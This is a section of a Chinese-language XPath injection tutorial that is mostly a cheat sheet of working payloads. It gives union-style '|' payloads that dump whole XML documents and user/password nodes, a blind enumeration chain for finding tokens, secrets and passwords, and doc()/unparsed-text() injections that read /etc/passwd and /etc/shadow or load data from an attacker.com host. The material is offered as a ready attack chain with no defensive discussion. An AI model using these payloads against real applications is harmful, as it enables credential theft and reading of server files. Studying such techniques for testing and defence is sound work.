## 四、数据提取：从注入到任意节点读取完整链

### 4.1 Union风格（XPath无UNION，用 | 组合多路径）
```
']|/ |//*|foo['
# 返回根节点所有数据

']|/*|foo['
# 返回根下所有子节点

']|//user|//password|foo['
# 返回所有用户和密码

']|//@*|//text()|//comment()|foo['
# 属性+文本+注释全量
```

### 4.2 结构枚举完整链（盲打时重建文档树）
```
步骤1 探测根节点名
' or name(/*)='users 或 ' or starts-with(name(/*),'u')

步骤2 统计节点规模
' or count(//*)>N
' or count(//user)>0

步骤3 逐节点枚举名称（结合name()与position()）
' or name(//*[position()=5])='password
' or name(//user[2]/*[3])='secret_key

步骤4 读取任意节点值
' or string(//*[contains(name(),'token')])='xxx
' or //user[username='admin']/password='xxx

步骤5 全量输出（XPath 2.0 一键拼接）
' or string-join(//*/concat(name(),'=',string(.)),'\n')=' 
' or string-join(//user/concat(username,':',password),'|')='
```
**完整攻击链**：注入点发现 → 根节点指纹 → 节点规模统计 → 名称枚举（结构重建）→ 定位敏感节点（token/secret/password/privateKey）→ 逐值提取。此链同样适用于后续第十二章的SAML/config.xml场景。

### 4.3 XPath 2.0 doc()/unparsed-text() 文件读取
```
# doc()加载外部XML/URL（若实现启用）
doc('file:///etc/passwd')
doc('http://attacker.com/data.xml')

# unparsed-text()读取任意文本文件
unparsed-text('file:///etc/passwd')
unparsed-text('file:///etc/shadow')

# 注入使用：
user=xxx'] | doc('file:///etc/passwd') | //*[foo='bar
```
**注意**：`doc()`/`unparsed-text()`/`collection()`是否可用取决于实现（Saxon默认受限；eXist/BaseX需权限配置），务必先探测`doc-available()`。

